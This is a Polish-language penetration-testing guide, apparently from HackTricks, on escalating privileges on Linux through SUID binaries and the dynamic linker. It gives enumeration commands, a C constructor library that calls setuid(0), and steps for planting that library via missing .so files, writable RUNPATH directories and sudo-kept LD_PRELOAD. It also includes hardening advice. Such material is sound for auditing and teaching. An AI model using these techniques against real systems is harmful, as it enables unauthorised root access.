# Nadużycia SUID, bibliotek współdzielonych i linkera

Pliki binarne SUID są zwykle sprawdzane pod kątem bezpośredniego wykonywania poleceń, ale niestandardowe programy SUID mogą być również podatne na ataki za pośrednictwem dynamicznego linkera. Wspólny schemat jest prosty: uprzywilejowany plik wykonywalny ładuje kod ze ścieżki lub konfiguracji, na którą użytkownik o niższych uprawnieniach może mieć wpływ.<sup>[[1]](#references)</sup>

Ta strona skupia się na ogólnych wzorcach technik: brakujących bibliotekach, zapisywalnych katalogach bibliotek, `RPATH`/`RUNPATH`, `LD_PRELOAD` za pośrednictwem sudo, konfiguracji linkera oraz pomyłkach związanych z hardlinkami SUID.

## Szybka enumeracja

Zacznij od znalezienia nietypowych plików SUID i sprawdzenia, czy są dynamicznie linkowane:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Skoncentruj się na niestandardowych lokalizacjach, niestandardowych ścieżkach aplikacji, plikach binarnych należących do użytkownika root, ale znajdujących się poza katalogami zarządzanymi przez system pakietów, oraz zależnościach ładowanych z katalogów z możliwością zapisu.<sup>[[1]](#references)</sup>

Przydatne kontrole możliwości zapisu:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Niektóre niestandardowe pliki binarne SUID próbują załadować shared object, który nie istnieje. Jeśli brakująca ścieżka znajduje się w katalogu kontrolowanym przez napastnika, plik binarny może załadować kod dostarczony przez napastnika jako użytkownik efektywny.<sup>[[1]](#references)</sup>

Znajdź nieudane wyszukiwania bibliotek za pomocą filtra wywołań systemowych `strace`:<sup>[[2]](#references)</sup>
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Jeśli plik binarny przeszukuje ścieżkę z możliwością zapisu w poszukiwaniu `libexample.so`, minimalna biblioteka demonstracyjna może używać konstruktora. Podczas walidacji należy zachować nieszkodliwy charakter demonstracji wpływu:<sup>[[6]](#references)</sup>
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Zbuduj ją, używając dokładnej nazwy pliku, który plik binarny próbuje załadować:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Warunkiem umożliwiającym wykorzystanie nie jest samo brakujące library. Atakujący musi mieć możliwość umieszczenia zgodnego shared object w ścieżce akceptowanej przez uprzywilejowany loader.<sup>[[1]](#references)</sup>

## Writable Library Directory

Czasami wszystkie dependencies istnieją, ale jeden z katalogów używanych do ich rozwiązywania jest zapisywalny. Może to umożliwić zastąpienie załadowanego library lub umieszczenie library o wyższym priorytecie i tej samej nazwie.<sup>[[1]](#references)</sup>

Sprawdź ścieżki dependencies:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Jeśli katalog jest zapisywalny, zweryfikuj to w laboratorium, stosując podejście bezpieczne dla kopii. Zastępowanie bibliotek systemowych na działającym hoście może pozostawić równocześnie uruchamiane procesy z niespójnymi wersjami bibliotek.<sup>[[8]](#references)</sup>

## RPATH and RUNPATH

`RPATH` i `RUNPATH` to wpisy sekcji dynamicznej, które informują loader, gdzie szukać bibliotek. Są niebezpieczne w programach SUID, gdy wskazują na katalogi zapisywalne przez attackera.<sup>[[1]](#references)</sup>

Wykryj je:<sup>[[3]](#references)[[10]](#references)</sup>
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Przykład ryzykownego wyniku:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Jeśli `/opt/app/lib` umożliwia zapis, a plik binarny wymaga `libcustom.so`, atakujący może umieścić tam złośliwy plik `libcustom.so`:<sup>[[1]](#references)</sup>
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` i `RUNPATH` nie są identyczne we wszystkich szczegółach rozwiązywania, ale w praktycznej ocenie privilege-escalation pytanie pozostaje takie samo: czy plik binarny SUID przeszukuje katalog z możliwością zapisu przez attackera w poszukiwaniu nazwy biblioteki?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH i SUID

W przypadku normalnych programów `LD_PRELOAD` i `LD_LIBRARY_PATH` mogą wymuszać lub wpływać na ładowanie shared object. W przypadku programów SUID dynamic loader zwykle przechodzi w tryb secure-execution i ignoruje niebezpieczne zmienne środowiskowe.<sup>[[1]](#references)</sup>

Oznacza to, że zwykły plik binarny SUID zazwyczaj nie jest podatny tylko dlatego, że użytkownik może ustawić `LD_PRELOAD`:<sup>[[1]](#references)</sup>
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Typowym wyjątkiem jest polityka sudo, która zezwala na ustawianie lub zachowywanie zmiennych loadera dla docelowego polecenia. Sprawdź `sudo -l` pod kątem wpisów takich jak `env_keep+=LD_PRELOAD` lub `env_keep+=LD_LIBRARY_PATH`; jeśli cel jest dynamicznie linkowany, może załadować kod kontrolowany przez atakującego:<sup>[[4]](#references)[[5]](#references)</sup>
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Nie myl tych przypadków; reguły loadera i polityki sudo powyżej je rozróżniają:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- `LD_PRELOAD` względem zwykłego binarnego SUID: zwykle blokowane przez secure execution.
- `LD_PRELOAD` zachowane przez sudo: potencjalnie exploitable.
- Brakujące `.so` w zapisywalnej ścieżce: exploitable, gdy binarny SUID naturalnie ładuje tę ścieżkę.
- `RPATH`/`RUNPATH` wskazujące na zapisywalny katalog: exploitable, gdy można kontrolować wymaganą bibliotekę.
- Dostęp do zapisu `/etc/ld.so.preload` lub konfiguracji linkera: systemowy i o dużym wpływie.

## Konfiguracja linkera

`ld.so` używa cache linkera i `/etc/ld.so.preload`; `ldconfig` buduje ten cache na podstawie `/etc/ld.so.conf` oraz plików dołączonych z tego pliku, zazwyczaj z `/etc/ld.so.conf.d/`.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Najważniejsze kontrole:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Konfiguracja linkera z możliwością zapisu jest zwykle poważniejsza niż pojedynczy podatny plik binarny SUID, ponieważ może wpływać na wiele dynamicznie linkowanych procesów. `/etc/ld.so.preload` jest szczególnie niebezpieczny, ponieważ może wymusić załadowanie shared object do uprzywilejowanych procesów.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## SUID Hardlink Confusion

Hardlinki mogą sprawić, że ten sam inode SUID będzie widoczny pod wieloma nazwami.<sup>[[9]](#references)</sup> Jest to przydatne do ukrywania uprzywilejowanego helpera, dezorientowania podczas czyszczenia lub obchodzenia naiwnego przeglądu opartego na ścieżkach.

Znajdź pliki SUID mające więcej niż jeden link:<sup>[[9]](#references)</sup>
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Sprawdź wszystkie ścieżki do tego samego i-węzła:<sup>[[9]](#references)</sup>
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Nadużycie nie polega na tym, że hardlink zmienia uprawnienia. Nadużycie polega na path confusion: uprzywilejowany inode może być dostępny za pośrednictwem nazwy, której obrońcy lub skrypty się nie spodziewają.<sup>[[9]](#references)</sup> Aby uzyskać więcej informacji o inode i workflow hardlinków, zobacz [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Defensive Notes

- Utrzymuj pliki binarne SUID w minimalnym zakresie, poddawaj je audytom i w miarę możliwości zarządzaj nimi za pomocą systemu pakietów.
- Unikaj wpisów `RPATH`/`RUNPATH` wskazujących na katalogi z możliwością zapisu lub zarządzane przez aplikacje.<sup>[[1]](#references)[[8]](#references)</sup>
- Utrzymuj katalogi bibliotek jako należące do roota i niedostępne do zapisu dla zwykłych użytkowników.<sup>[[8]](#references)</sup>
- Nie zachowuj zmiennych loadera `LD_PRELOAD`, `LD_LIBRARY_PATH` ani podobnych za pośrednictwem sudo.<sup>[[1]](#references)[[5]](#references)</sup>
- Monitoruj `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` oraz nieoczekiwane pliki SUID.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- Sprawdzaj pliki SUID z hardlinkami i analizuj niestandardowe wrappery SUID poza standardowymi ścieżkami systemowymi.<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — strona podręcznika Linux](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (narzędzia binarne GNU)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — strona podręcznika Linux](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — strona podręcznika Linux](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Common Attributes (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Dynamic Linker Hardening (biblioteka GNU C)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hard Links (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (narzędzia binarne GNU)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
{{#include ../../banners/hacktricks-training.md}}
